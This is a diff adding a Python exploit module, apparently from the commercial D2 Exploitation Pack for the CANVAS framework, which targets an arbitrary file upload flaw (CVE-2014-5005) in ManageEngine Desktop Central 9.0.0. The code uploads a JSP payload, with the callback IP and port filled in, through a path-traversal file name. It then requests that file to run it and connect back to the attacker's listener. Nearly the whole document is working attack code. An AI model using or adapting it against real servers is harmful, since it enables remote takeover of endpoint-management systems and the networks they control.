@@ -1,0 +1,130 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "ManageEngine Desktop Central 9.0.0 Arbitrary File Upload Remote Code Execution Vulnerability"
+
+DESCRIPTION = "File Upload Remote Code Execution vulnerability in ManageEngine Desktop Central"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ManageEngine"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "9.0.0 build 90054"
+DOCUMENTATION["Date public"] = "2014.09.01"
+DOCUMENTATION["References"] = "https://raw.githubusercontent.com/pedrib/PoC/master/me_dc9_file_upload.txt"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2014-5005"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5005"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_desktopcentral2/d2.jsp"    
+    self.protocol = "http"
+    self.port = 8400
+    self.sslport = 8383
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):  
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+        
+    # Upload JSP file                         
+    url = "/statusUpdate?actionToCall=LFU&customerId=2&configDataID=1&fileName=../../../../../../d2.jsp"
+    
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    handle = spkproxy.urlopen(mainurl, exploit=self, data=fdata, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"), ("Content-Type", "text/html")], verb="POST")
+    data = handle.read()  
+	
+    # Execute uploaded JSP file
+    url = "/d2.jsp"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    handle = spkproxy.urlopen(mainurl, exploit=self, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)")])
+    data = handle.read()  
+            		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
